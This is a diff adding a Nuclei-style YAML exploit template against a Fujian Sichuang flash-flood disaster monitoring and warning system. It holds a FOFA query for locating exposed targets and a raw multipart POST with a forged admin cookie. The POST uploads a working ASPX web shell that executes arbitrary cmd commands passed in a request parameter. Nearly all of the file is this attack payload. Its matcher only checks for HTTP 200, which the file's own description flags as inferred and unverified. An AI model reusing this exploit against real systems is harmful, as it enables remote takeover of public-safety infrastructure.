@@ -1,0 +1,62 @@
+id: poc-gayegxwsgo0gt6cs
+info:
+  name: 福建四创软件有限公司 山洪灾害监测系统存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gayegxwsgo0gt6cs
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gayegxwsgo0gt6cs
+    fofa: title="山洪灾害监测预警" && body="福建四创软件有限公司"
+http:
+- raw:
+  - 'POST /SysManage/AjaxHandler/AD_EvacuateRouteHandler.ashx HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
+
+    Gecko) Chrome/62.0.1190.95 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0
+
+    Cookie: UserName=admin; IsRememberUser=1; username=admin; RealName=admin;
+
+
+    "------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\nContent-Disposition: form-data;\
+
+    \ name=\"Filename\"\n\n-201712120126376680.aspx\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\n\
+
+    Content-Disposition: form-data; name=\"action\"\n\nUploadFile\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\n\
+
+    Content-Disposition: form-data; name=\"ADCD\"\n\n330105000000000\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\n\
+
+    Content-Disposition: form-data; name=\"fileext\"\n\n*.jpg;*.gif;*.png;\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\n\
+
+    Content-Disposition: form-data; name=\"folder\"\n\n/UploadFile\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\n\
+
+    Content-Disposition: form-data; name=\"type\"\n\n1\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\n\
+
+    Content-Disposition: form-data; name=\"Filedata\"; filename=\"201712120126376682.aspx\"\
+
+    \nContent-Type: application/octet-stream\n\n<%@ Page Language=\"Jscript\" validateRequest=\"\
+
+    false\" %>\n<%\nvar c=new System.Diagnostics.ProcessStartInfo(\"cmd\");\nvar\
+
+    \ e=new System.Diagnostics.Process();\nvar out:System.IO.StreamReader,EI:System.IO.StreamReader;\n\
+
+    c.UseShellExecute=false;\nc.RedirectStandardOutput=true;\nc.RedirectStandardError=true;\n\
+
+    e.StartInfo=c;\nc.Arguments=\"/c \" + Request.Item[\"cmd\"];\ne.Start();\nout=e.StandardOutput;\n\
+
+    EI=e.StandardError;\ne.Close();\nResponse.Write(out.ReadToEnd() + EI.ReadToEnd());\n\
+
+    Response.End();\n%>\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0\nContent-Disposition:\
+
+    \ form-data; name=\"Upload\"\n\nSubmit Query\n------------Ij5cH2ae0gL6gL6GI3Ij5GI3KM7ae0--"'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
